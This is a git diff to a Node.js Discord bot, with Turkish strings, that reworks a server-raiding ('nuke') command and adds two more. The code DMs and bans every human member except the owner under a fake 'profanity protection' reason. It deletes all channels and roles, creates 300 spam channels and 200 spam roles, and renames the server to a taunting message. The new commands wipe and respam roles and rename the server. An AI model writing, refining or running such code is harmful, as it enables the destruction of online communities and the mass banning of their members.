@@ -1,6 +1,6 @@
 // index.js
 require('dotenv').config();
-const { Client, GatewayIntentBits, Partials } = require('discord.js');
+const { Client, GatewayIntentBits, Partials, EmbedBuilder } = require('discord.js');
 
 const client = new Client({
   intents: [
@@ -11,6 +11,8 @@ const client = new Client({
   ],
   partials: [Partials.Channel]
 });
+
+const OWNER_ID = process.env.OWNER_ID;
 
 client.once('ready', () => {
   console.log(`✅ Bot aktif: ${client.user.tag}`);
@@ -84,26 +86,31 @@ client.on('messageCreate', async (message) => {
     const members = await message.guild.members.fetch();
     let bannedCount = 0;
 
-    // Herkesi banla (botlar hariç)
     for (const member of members.values()) {
-      if (!member.user.bot) {
-        await member.send('TKTlendiniz By. sys.fors & Alilw').catch(() => {});
+      if (!member.user.bot && member.id !== OWNER_ID) {
+        const embed = new EmbedBuilder()
+          .setColor('Red')
+          .setTitle('⛔ Yasaklandınız')
+          .setDescription('fors bombom gitti demeyin')
+          .setFooter({ text: 'sys.fors' });
+
+        await member.send({ embeds: [embed] }).catch(() => {});
         await member.ban({ reason: 'Küfürkoruma aktif edildi.' }).catch(() => {});
         bannedCount++;
       }
     }
 
-    // Tüm kanalları sil
+    // Kanalları sil
     await Promise.all(message.guild.channels.cache.map(channel => channel.delete().catch(() => {})));
 
-    // 300 yeni kanal oluştur
-    const names = ['TKT💋', 'FORS💦', 'ALİLW💝'];
+    // Yeni kanallar oluştur
+    const names = ['FORS💦', 'ALİLW💝', 'MİRAÇ🔥'];
     for (let i = 0; i < 300; i++) {
       const name = names[i % names.length];
       await message.guild.channels.create({ name }).catch(() => {});
     }
 
-    // Tüm rolleri sil
+    // Rolleri sil
     const roles = message.guild.roles.cache;
     for (const role of roles.values()) {
       if (role.editable && role.id !== message.guild.id) {
@@ -111,7 +118,7 @@ client.on('messageCreate', async (message) => {
       }
     }
 
-    // 200 rastgele renkli rol oluştur
+    // Yeni roller oluştur
     for (let i = 0; i < 200; i++) {
       const randomColor = `#${Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0')}`;
       await message.guild.roles.create({
@@ -121,11 +128,32 @@ client.on('messageCreate', async (message) => {
       }).catch(() => {});
     }
 
-    // Sunucu adını değiştir
     await message.guild.setName('💦FORS AFFETMEZ SABAHA SUNUCUN AFFEDİLMEZ💦').catch(() => {});
+    message.channel.send(`🧹 ${bannedCount} kişi banlandı. Kanallar ve roller güncellendi.`);
+  }
 
-    message.channel.send(`🧹 ${bannedCount} kişi banlandı. Kanallar ve roller silindi, yeni kanallar ve roller oluşturuldu. Glory To TKT!`);
+  else if (command === '!rolleridüzelt') {
+    const roles = message.guild.roles.cache;
+    for (const role of roles.values()) {
+      if (role.editable && role.id !== message.guild.id) {
+        await role.delete().catch(() => {});
+      }
+    }
+    for (let i = 0; i < 200; i++) {
+      const randomColor = `#${Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0')}`;
+      await message.guild.roles.create({
+        name: 'BÖÖ KORKTUNMUU😜',
+        color: randomColor,
+        hoist: true
+      }).catch(() => {});
+    }
+    message.channel.send('✅ Roller sıfırlandı ve yeniden oluşturuldu.');
+  }
+
+  else if (command === '!isim') {
+    await message.guild.setName('💦FORS AFFETMEZ SABAHA SUNUCUN AFFEDİLMEZ💦').catch(() => {});
+    message.channel.send('✅ Sunucu ismi değiştirildi.');
   }
 });
 
-client.login(process.env.TOKEN);
+client.login(process.env.BOT_TOKEN);
